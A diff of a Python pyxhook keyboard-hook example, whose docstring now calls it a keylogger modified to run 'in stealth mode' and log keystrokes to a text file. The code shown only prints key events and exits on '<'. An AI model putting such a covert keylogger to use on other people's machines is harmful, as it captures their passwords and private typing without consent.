@@ -1,7 +1,12 @@
 """
 A simple example of hooking the keyboard on Linux using pyxhook
 
-Any key pressed prints out the keys values, program terminates when spacebar is pressed
+Any key pressed prints out the keys values, program terminates when "<" key is pressed.
+
+This keylloger is originally created by Tim Alexander <dragonfyre13@gmail.com> but was modified by Slaveworx
+to work in stealth mode and output the KeyDown events to a text file instead of just printing KeyUp and KeyDown events on screen.
+
+SLAVEWORX 2015
 """
 
 #Libraries we need
@@ -16,12 +21,11 @@ def kbevent( event ):
     #print key info
     print event
     
-    #If the ascii value matches spacebar, terminate the while loop :spacebar is 32:
+    #If the ascii value matches "<" key the script exits:
     if event.Ascii == 60:
         global running
         running = False
-
-
+        
 
 
 
